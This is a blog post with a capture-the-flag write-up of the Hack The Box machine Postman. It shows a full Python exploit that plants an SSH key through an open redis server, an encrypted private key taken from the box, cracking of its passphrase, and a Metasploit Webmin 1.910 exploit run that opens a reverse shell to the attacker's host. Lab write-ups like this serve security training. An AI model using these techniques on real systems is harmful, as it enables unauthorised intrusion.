
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="robots" content="" />

  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="../../theme/stylesheet/style.min.css">

    <link id="dark-theme-style" rel="stylesheet" type="text/css"
          media="(prefers-color-scheme: dark)"
    href="../../theme/stylesheet/dark-theme.min.css">

    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: dark)"
          href="../../theme/pygments/monokai.min.css">
    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)"
          href="../../theme/pygments/sas.min.css">


  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/fontawesome.css">
  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/brands.css">
  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/solid.css">


    <link href="https://maggick.fr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="maggick's logs Atom">



  


 

<meta name="author" content="maggick" />
<meta name="description" content="This is a writeup about a retired HacktheBox machine: Postman publish on Novemer the second 2019 by TheCyberGeek. This box is rated as easy box. It implies a redis server, a id_rsa.bak, john the ripper and webmin 1.910." />
<meta name="keywords" content="security, boot2root, HTB, redis, webmin, linux">


  <meta property="og:site_name" content="maggick's logs"/>
  <meta property="og:title" content="HTB: Postman"/>
  <meta property="og:description" content="This is a writeup about a retired HacktheBox machine: Postman publish on Novemer the second 2019 by TheCyberGeek. This box is rated as easy box. It implies a redis server, a id_rsa.bak, john the ripper and webmin 1.910."/>
  <meta property="og:locale" content="en_US"/>
  <meta property="og:url" content="../../2020/03/htb-postman.html"/>
  <meta property="og:type" content="article"/>
  <meta property="article:published_time" content="2020-03-15 09:30:00+01:00"/>
  <meta property="article:modified_time" content=""/>
  <meta property="article:author" content="../../author/maggick.html">
  <meta property="article:section" content="security"/>
  <meta property="article:tag" content="security"/>
  <meta property="article:tag" content="boot2root"/>
  <meta property="article:tag" content="HTB"/>
  <meta property="article:tag" content="redis"/>
  <meta property="article:tag" content="webmin"/>
  <meta property="article:tag" content="linux"/>
  <meta property="og:image" content="https://maggick.fr/media/image.png">

  <title>maggick's logs &ndash; HTB: Postman</title>

</head>
<body >
  <aside>
    <div>
      <a href="../../">
        <img src="https://maggick.fr/media/image.png" alt="maggick's logs" title="maggick's logs">
      </a>

      <h1>
        <a href="../../">maggick's logs</a>
      </h1>

<p>Offensive security tales</p>

      <nav>
        <ul class="list">


              <li>
                <a target="_self"
                   href="../../pages/about.html">
                  About
                </a>
              </li>
              <li>
                <a target="_self"
                   href="../../pages/notes.html">
                  Notes
                </a>
              </li>
              <li>
                <a target="_self"
                   href="../../pages/tools.html">
                  Tools
                </a>
              </li>

        </ul>
      </nav>

      <ul class="social">
          <li>
            <a  class="sc-github" href="https://github.com/maggick" target="_blank">
              <i class="fab fa-github"></i>
            </a>
          </li>
          <li>
            <a  class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
              <i class="fab fa-twitter"></i>
            </a>
          </li>
          <li>
            <a  class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
              <i class="fab fa-stack-overflow"></i>
            </a>
          </li>
          <li>
            <a  class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
              <i class="fas fa-rss"></i>
            </a>
          </li>
      </ul>
    </div>

  </aside>
  <main>

    <nav>
      <a href="../../">Home</a>

      <a href="/archives.html">Archives</a>
      <a href="/categories.html">Categories</a>
      <a href="/tags.html">Tags</a>

      <a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>

    </nav>

<article class="single">
  <header>
      
    <h1 id="htb-postman">HTB: Postman</h1>
    <p>
      Posted on 15 Mar 2020 in <a href="../../category/security.html">security</a>

        &#8226; 6 min read
    </p>
  </header>


  <div>
    <p><img class="align-left" src="/media/2020.03/postman_card.png" alt="Postman Card" width="262"></p>
<p>This is a writeup about a retired HacktheBox machine:
<a href="https://www.hackthebox.com/home/machines/profile/215">Postman</a> publish on
Novemer the second 2019 by
<a href="https://www.hackthebox.com/home/users/profile/114053">TheCyberGeek</a>.
This box is rated as easy box. It implies a redis server, a <code>id_rsa.bak</code>, john
the ripper and webmin 1.910.</p>


<h1>Recon</h1>
<h2>nmap</h2>
<p>Let us start as always by a <code>nmap</code> scan. The box is quit busy so first of all we
run a simple aggressive TCP scan:</p>
<div class="highlight"><pre><span></span><code># Nmap 7.80 scan initiated Tue Nov 19 16:52:02 2019 as: nmap -p- -sS -oA nmap_all_port -T4 10.10.10.160
Nmap scan report for 10.10.10.160
Host is up (0.090s latency).
Not shown: 65530 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
4444/tcp  open  krb524
6379/tcp  open  redis
10000/tcp open  snet-sensor-mgmt
</code></pre></div>

<p>We run a version scan on this open ports:</p>
<div class="highlight"><pre><span></span><code># Nmap 7.80 scan initiated Tue Nov 19 18:32:32 2019 as: nmap -p22,80,4444,6379,10000 -sSV -oA nmap_version 10.10.10.160
Nmap scan report for 10.10.10.160
Host is up (0.087s latency).

PORT      STATE  SERVICE VERSION
22/tcp    open   ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp    open   http    Apache httpd 2.4.29 ((Ubuntu))
4444/tcp  closed krb524
6379/tcp  open   redis   Redis key-value store 4.0.9
10000/tcp open   http    MiniServ 1.910 (Webmin httpd)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div>

<p>The open ports are:</p>
<ul>
<li>22: SSH</li>
<li>80: a web server</li>
<li>6379: a redis server</li>
<li>10 000: another web server</li>
</ul>
<p>We do not have any information to connect to the SSH server.</p>
<p>The website on port 80 does not give us anything.</p>
<p>The website on port 10 000 is a webmin login interface. There is a few exploit
available for it. But none of it works.</p>
<div class="highlight"><pre><span></span><code>searchsploit webmin
-------------------------------------------------------------------------
Exploit Title

-------------------------------------------------------------------------
DansGuardian Webmin Module 0.x - &#39;edit.cgi&#39; Directory Traversal
Webmin - Brute Force / Command Execution
Webmin 0.9x / Usermin 0.9x/1.0 - Access Session ID Spoofing
Webmin 0.x - &#39;RPC&#39; Privilege Escalation
Webmin 0.x - Code Input Validation
Webmin 1.5 - Brute Force / Command Execution
Webmin 1.5 - Web Brute Force (CGI)
Webmin 1.580 - &#39;/file/show.cgi&#39; Remote Command Execution (Metasploit)
Webmin 1.850 - Multiple Vulnerabilities
Webmin 1.900 - Remote Command Execution (Metasploit)
Webmin 1.910 - &#39;Package Updates&#39; Remote Command Execution (Metasploit)
Webmin 1.920 - Remote Code Execution
Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)
Webmin 1.x - HTML Email Command Execution
Webmin &lt; 1.290 / Usermin &lt; 1.220 - Arbitrary File Disclosure (PHP)
Webmin &lt; 1.290 / Usermin &lt; 1.220 - Arbitrary File Disclosure (Perl)
phpMyWebmin 1.0 - &#39;target&#39; Remote File Inclusion
phpMyWebmin 1.0 - &#39;window.php&#39; Remote File Inclusion
webmin 0.91 - Directory Traversal
-------------------------------------------------------------------------
Shellcodes: No Result
</code></pre></div>

<h2>Redis</h2>
<p>The last service is the redis server. We use redis-cli in order to connect to
it and start enumerating using the autocompletion.</p>
<div class="highlight"><pre><span></span><code>root@kalili:~# redis-cli -h 10.10.10.160
10.10.10.160:6379&gt; CONFIG GET dbfilename
1) &quot;dbfilename&quot;
2) &quot;authorized_keys&quot;
10.10.10.160:6379&gt; CONFIG GET dir
1) &quot;dir&quot;
2) &quot;/var/lib/redis/.ssh&quot;
</code></pre></div>

<p>A quick Google search for "redis ssh exploit" return this
<a href="https://github.com/Avinash-acid/Redis-Server-Exploit">github repository</a>.
We modify the script to include our <code>.ssh</code> folder:</p>
<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/python</span>
<span class="c1">#Author : Avinash Kumar Thapa aka -Acid</span>
<span class="c1">#Twitter : https://twitter.com/m_avinash143</span>

<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">os.path</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>
<span class="kn">from</span> <span class="nn">termcolor</span> <span class="kn">import</span> <span class="n">colored</span>


<span class="n">script</span><span class="p">,</span> <span class="n">ip_address</span><span class="p">,</span> <span class="n">username</span> <span class="o">=</span> <span class="n">argv</span>


<span class="n">PATH</span><span class="o">=</span><span class="s1">&#39;/usr/bin/redis-cli&#39;</span>
<span class="n">PATH1</span><span class="o">=</span><span class="s1">&#39;/usr/local/bin/redis-cli&#39;</span>

<span class="k">def</span> <span class="nf">ssh_connection</span><span class="p">():</span>
  <span class="n">shell</span> <span class="o">=</span> <span class="s2">&quot;ssh -i &quot;</span> <span class="o">+</span> <span class="s1">&#39;$HOME/.ssh/id_rsa &#39;</span> <span class="o">+</span> <span class="n">username</span><span class="o">+</span><span class="s2">&quot;@&quot;</span><span class="o">+</span><span class="n">ip_address</span>
  <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">shell</span><span class="p">)</span>

<span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">PATH</span><span class="p">)</span> <span class="ow">or</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">PATH1</span><span class="p">):</span>
  <span class="k">try</span><span class="p">:</span>
        <span class="nb">print</span> <span class="n">colored</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\t</span><span class="s1">*******************************************************************&#39;</span><span class="p">,</span> <span class="s2">&quot;green&quot;</span><span class="p">)</span>
        <span class="nb">print</span> <span class="n">colored</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\t</span><span class="s1">* [+] [Exploit] Exploiting misconfigured REDIS SERVER*&#39;</span> <span class="p">,</span><span class="s2">&quot;green&quot;</span><span class="p">)</span>
        <span class="nb">print</span> <span class="n">colored</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\t</span><span class="s1">* [+] AVINASH KUMAR THAPA aka &quot;-Acid&quot;                                &#39;</span><span class="p">,</span> <span class="s2">&quot;green&quot;</span><span class="p">)</span>
    <span class="nb">print</span> <span class="n">colored</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\t</span><span class="s1">*******************************************************************&#39;</span><span class="p">,</span> <span class="s2">&quot;green&quot;</span><span class="p">)</span>
    <span class="nb">print</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span>
    <span class="nb">print</span> <span class="n">colored</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\t</span><span class="s2"> SSH Keys Need to be Generated&quot;</span><span class="p">,</span> <span class="s1">&#39;blue&#39;</span><span class="p">)</span>
    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;ssh-keygen -t rsa -C </span><span class="se">\&quot;</span><span class="s1">acid_creative</span><span class="se">\&quot;</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="nb">print</span> <span class="n">colored</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\t</span><span class="s2"> Keys Generated Successfully&quot;</span><span class="p">,</span> <span class="s2">&quot;blue&quot;</span><span class="p">)</span>
    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;(echo &#39;</span><span class="se">\r\n\&#39;</span><span class="s2">; cat $HOME/.ssh/id_rsa.pub; echo  </span><span class="se">\&#39;\r\n\&#39;</span><span class="s2">) &gt; $HOME/.ssh/public_key.txt&quot;</span><span class="p">)</span>
    <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&quot;redis-cli -h &quot;</span> <span class="o">+</span> <span class="n">ip_address</span> <span class="o">+</span> <span class="s1">&#39; flushall&#39;</span>
    <span class="n">cmd1</span> <span class="o">=</span> <span class="s2">&quot;redis-cli -h &quot;</span> <span class="o">+</span> <span class="n">ip_address</span>
    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
    <span class="n">cmd2</span> <span class="o">=</span> <span class="s2">&quot;cat $HOME/.ssh/public_key.txt | redis-cli -h &quot;</span> <span class="o">+</span>  <span class="n">ip_address</span> <span class="o">+</span> <span class="s1">&#39; -x set cracklist&#39;</span>
    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">cmd2</span><span class="p">)</span>
    <span class="n">cmd3</span> <span class="o">=</span> <span class="n">cmd1</span> <span class="o">+</span> <span class="s1">&#39; config set dbfilename &quot;backup.db&quot; &#39;</span>
                <span class="n">cmd4</span> <span class="o">=</span> <span class="n">cmd1</span> <span class="o">+</span> <span class="s1">&#39; config set dir &quot;/var/lib/redis/.ssh/&quot; &#39;</span>
    <span class="n">cmd5</span> <span class="o">=</span> <span class="n">cmd1</span> <span class="o">+</span> <span class="s1">&#39; config set dbfilename &quot;authorized_keys&quot; &#39;</span>
    <span class="n">cmd6</span> <span class="o">=</span> <span class="n">cmd1</span> <span class="o">+</span> <span class="s1">&#39; save&#39;</span>
    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">cmd3</span><span class="p">)</span>
    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">cmd4</span><span class="p">)</span>
    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">cmd5</span><span class="p">)</span>
    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">cmd6</span><span class="p">)</span>
    <span class="nb">print</span> <span class="n">colored</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\t</span><span class="s2">You&#39;ll get shell in sometime..Thanks for your patience&quot;</span><span class="p">,</span> <span class="s2">&quot;green&quot;</span><span class="p">)</span>
    <span class="n">ssh_connection</span><span class="p">()</span>

  <span class="k">except</span><span class="p">:</span>
    <span class="nb">print</span> <span class="s2">&quot;Something went wrong&quot;</span>
<span class="k">else</span><span class="p">:</span>
  <span class="nb">print</span> <span class="n">colored</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\t</span><span class="s2">Redis-cli:::::This utility is not present on your system. You need to install it to proceed further.&quot;</span><span class="p">,</span> <span class="s2">&quot;red&quot;</span><span class="p">)</span>
</code></pre></div>

<p>Running this script will give us a shell as redis.</p>
<div class="highlight"><pre><span></span><code>python redis.py 10.10.10.160 redis
  *******************************************************************
  * [+] [Exploit] Exploiting misconfigured REDIS SERVER*
  * [+] AVINASH KUMAR THAPA aka &quot;-Acid&quot;
  *******************************************************************


  SSH Keys Need to be Generated
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa):
/root/.ssh/id_rsa already exists.
Overwrite (y/n)? y
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /root/.ssh/id_rsa.
Your public key has been saved in /root/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:AXkEW81gyz1YrQfxEQw3t82W/NoAp6q8IdpYTPV8sN0 acid_creative
The key&#39;s randomart image is:
+---[RSA 3072]----+
|      o+=++==..  |
|      .*.=+oo+.+.|
|      ..* +oo oo+|
|       . +.=.= ..|
|      . S +.+ E .|
|     o     o   + |
|      + . .   . .|
|     = o o       |
|    o . +.       |
+----[SHA256]-----+
  Keys Generated Successfully
OK
OK
OK
OK
OK
OK
  You&#39;ll get shell in sometime..Thanks for your patience
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)

* Documentation:  https://help.ubuntu.com
* Management:     https://landscape.canonical.com
* Support:        https://ubuntu.com/advantage


* Canonical Livepatch is available for installation.
  - Reduce system reboots and improve kernel security. Activate at:
    https://ubuntu.com/livepatch
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Wed Nov 20 15:31:13 2019 from 10.10.14.110
redis@Postman:~$
</code></pre></div>

<h1>Getting user</h1>
<h2>Enumeration</h2>
<p>We start enumerating. We quickly see that the user is <code>Matt</code>. Our <code>redis</code> user
has a non-empty bash history we can look at.</p>
<div class="highlight"><pre><span></span><code>redis@Postman:~$ cat .bash_history
exit
su Matt
pwd
nano scan.py
python scan.py
nano scan.py
clear
nano scan.py
clear
python scan.py
exit
exit
cat /etc/ssh/sshd_config
su Matt
clear
cd /var/lib/redis
su Matt
exit
cat id_rsa.bak
ls -la
exit
cat id_rsa.bak
exit
ls -la
crontab -l
systemctl enable redis-server
redis-server
ifconfig
netstat -a
netstat -a
netstat -a
netstat -a
netstat -a &gt; txt
exit
crontab -l
cd ~/
ls
nano 6379
exit
</code></pre></div>

<p>When searching for the files mentioned in the history we found that the
<code>id_rsa.bak</code> key exist in <code>/opt/</code> and is an encrypted RSA private key.</p>
<div class="highlight"><pre><span></span><code>redis@Postman:~$ find / -name &#39;id_rsa.bak&#39; 2&gt; /dev/null^C
/opt/id_rsa.bak
redis@Postman:~$ cat /opt/id_rsa.bak
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C

JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
-----END RSA PRIVATE KEY-----
</code></pre></div>

<p>We copy the key on our computer and use <code>ssh2john</code> to extract the hash from the
key and run a john on it: the password is <code>computer2008</code>.</p>
<div class="highlight"><pre><span></span><code>python2 /usr/bin/ssh2john redis_rsa &gt; redis_rsa.hash
john redis_rsa.hash -w=rockyou.txt
computer2008
</code></pre></div>

<p>The key does not allow us to connect using the SSH key (the ssh connection
closed immediately). I also tried this creds for a locally elevation with <code>su</code>
and it works… I do not know why the user will have the same password as it
sshkey passphrase but it works and we get the user flag.</p>
<div class="highlight"><pre><span></span><code>redis@Postman:~$ su Matt
Password:
Matt@Postman:/var/lib/redis$ cd
Matt@Postman:~$ ls
user.txt
Matt@Postman:~$ cat user.txt
517ad0&lt;redacted&gt;
</code></pre></div>

<h1>Getting root</h1>
<p>The previous creds also work on the webmin authentication form allowing us to
login an see the webmin version: 1.910.</p>
<p><img alt="webmin dashboard" src="/media/2020.03/postman_1.png"></p>
<p>The exploit for searchsploit should works.</p>
<div class="highlight"><pre><span></span><code>Webmin 1.910 - &#39;Package Updates&#39; Remote Command Execution (Metasploit)  | exploits/linux/remote/46984.rb
</code></pre></div>

<p>We import the script in metasploit:</p>
<div class="highlight"><pre><span></span><code>mkdir ~/.msf/modules/exploits/linux/remote
cp /usr/share/exploitdb/exploits/linux/remote/46984.rb
updated
msfconsole
</code></pre></div>

<p>We give to metasploit all the needed information (user, password, IPs) and do
not forget to put the <code>SSL</code> parameter to <code>true</code>.</p>
<div class="highlight"><pre><span></span><code>msf5 exploit(linux/remote/46984) &gt; show options

Module options (exploit/linux/remote/46984):

  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  PASSWORD   computer2008     yes       Webmin Password
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS     10.10.10.160     yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
  RPORT      10000            yes       The target port (TCP)
  SSL        true             no        Negotiate SSL/TLS for outgoing connections
  TARGETURI  /                yes       Base path for Webmin application
  USERNAME   Matt             yes       Webmin Username
  VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

  Name   Current Setting  Required  Description
  ----   ---------------  --------  -----------
  LHOST  10.10.14.13      yes       The listen address (an interface may be specified)
  LPORT  4444             yes       The listen port


Exploit target:

  Id  Name
  --  ----
  0   Webmin &lt;= 1.910
</code></pre></div>

<p>Then we run the script. We are directly root on the box and get the flag.</p>
<div class="highlight"><pre><span></span><code>msf5 exploit(linux/remote/46984) &gt; run
[*] Started reverse TCP handler on 10.10.14.13:4444
[+] Session cookie: a2ff4450e3a344159ab1fd464db52855
[*] Attempting to execute the payload...
[*] Command shell session 1 opened (10.10.14.13:4444 -&gt; 10.10.10.160:32916) at 2019-11-20 14:39:02 +0100

id
uid=0(root) gid=0(root) groups=0(root)
cat root.txt
cat /root/root.txt
a2577&lt;redacted&gt;
</code></pre></div>

<h1>Wrapping up</h1>
<p>This box was not the most interesting one as everything is pretty straight
forward. Moreover the name
suggested me that there will be some SMTP (or IMAP) involved. I am a bit
disappointed.</p>
  </div>
  <div class="tag-cloud">
    <p>
      <a href="../../tag/security.html">security</a>
      <a href="../../tag/boot2root.html">boot2root</a>
      <a href="../../tag/htb.html">HTB</a>
      <a href="../../tag/redis.html">redis</a>
      <a href="../../tag/webmin.html">webmin</a>
      <a href="../../tag/linux.html">linux</a>
    </p>
  </div>


  <div class="neighbors">
    <a class="btn float-left" href="../../2020/02/vault.html" title="Vault">
      <i class="fa fa-angle-left"></i> Previous Post
    </a>
    <a class="btn float-right" href="../../2020/03/htb-forest.html" title="HTB: Forest">
      Next Post <i class="fa fa-angle-right"></i>
    </a>
  </div>



</article>

    <footer>
<p>
  &copy; 2022  - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/deed.en_US" target="_blank">Creative Commons Attribution</a>
</p>
<p>
Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
  <span class="footer-separator">|</span>
  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
  <script id="dark-theme-script"
          src="../../theme/dark-theme/dark-theme.min.js"
          data-enable-auto-detect-theme="True"
          data-default-theme="light"
          type="text/javascript">
  </script>
</p><p>
  <a rel="license"
     href="http://creativecommons.org/licenses/by/4.0/"
     target="_blank">
    <img alt="Creative Commons License"
         title="Creative Commons License"
         style="border-width:0"
           src="https://i.creativecommons.org/l/by/4.0/80x15.png"
         width="80"
         height="15"/>
  </a>
</p>    </footer>
  </main>




<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " maggick's logs ",
  "url" : "../..",
  "image": "https://maggick.fr/media/image.png",
  "description": ""
}
</script>

</body>
</html>